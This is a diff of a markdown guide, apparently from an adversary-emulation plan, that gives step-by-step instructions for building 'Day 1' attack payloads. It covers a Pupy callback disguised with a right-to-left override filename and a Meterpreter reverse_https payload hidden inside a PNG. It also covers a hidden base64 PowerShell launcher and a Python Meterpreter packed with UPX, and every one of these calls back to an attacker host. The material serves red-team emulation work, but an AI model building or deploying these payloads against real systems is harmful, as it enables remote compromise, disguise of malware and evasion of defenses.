@@ -1,12 +1,10 @@
 ### Create Day 1 Payloads
 
-
 #### 1. CosmicDuke Payload (cod.3aka3.scr)
 
 | Filename | Location | Description |
 | ------ | ------ | ------ |
 | cod.3aka3.scr | payloads/cod.3aka3.scr | Portable executable that uses right-to-left override character to disguise file extension |
-
 
 1. Generate a Pupy-EC4 callback payload:
 
@@ -14,8 +12,8 @@
 gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234
 ```
 
-2. On Windows attack platform, rename cod.3aka3.scr with right-to-left override character (https://redcanary.com/blog/right-to-left-override/)
-  
+2. On Windows attack platform, rename cod.3aka3.scr with right-to-left override character (<https://redcanary.com/blog/right-to-left-override/>)
+
     1. Windows key and type 'Character Map'; select open
     2. Scroll to the RTLO character (U+202E)
     3. Select the RTLO character, then click "select", then click "copy"
@@ -25,8 +23,7 @@ gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker
 
 ![alt text](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/041515_2317_SpoofUsingR1.png)
 
-Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/
-
+Screenshot taken from: <https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/>
 
 #### 2. Privilege Escalation Payload (monkey.png)
 
@@ -35,13 +32,14 @@ Screenshot taken from: https://resources.infosecinstitute.com/spoof-using-right-
 | monkey.png | payloads/monkey.png | Well formed PNG with embedded PowerShell-Meterpreter callback |
 
 Steps to re-create:
+
 1. Generate a PowerShell-formatted Meterpreter payload:
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1
 ```
 
-2. Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage (https://github.com/peewpw/Invoke-PSImage):
+2. Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage (<https://github.com/peewpw/Invoke-PSImage>):
 
 ```
 Import-Module .\Invoke-PSImage.ps1
@@ -55,14 +53,15 @@ Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg
 
 | Filename | Location | Description |
 | ------ | ------ | ------ |
-| strings64.exe | payloads/SysinternalsSuite/strings64.exe | Launches Meterpreter using CreateProcessWithToken API call 
+| strings64.exe | payloads/SysinternalsSuite/strings64.exe | Launches Meterpreter using CreateProcessWithToken API call
+
 1. Generate PowerShell-formatted Meterpreter:
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh-cmd
 ```
 
-2. Copy the PowerShell 1-liner to clipboard. Your clipboard should look like: 
+2. Copy the PowerShell 1-liner to clipboard. Your clipboard should look like:
 
 `powershell.exe -nop -w hidden -e aQBmAc...base64 string...KAOwa=`
 
@@ -98,13 +97,13 @@ msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o p
 
 2. Transfer python.py to Windows attack platform
 
-3. Compile python.py into a portable executable using PyInstaller (https://pypi.org/project/PyInstaller/)
+3. Compile python.py into a portable executable using PyInstaller (<https://pypi.org/project/PyInstaller/>)
 
 ```
 pyinstaller -F python.py
 ```
 
-4. Pack the python.exe payload using UPX (https://github.com/upx/upx)
+4. Pack the python.exe payload using UPX (<https://github.com/upx/upx>)
 
 ```
 upx --brute python.exe
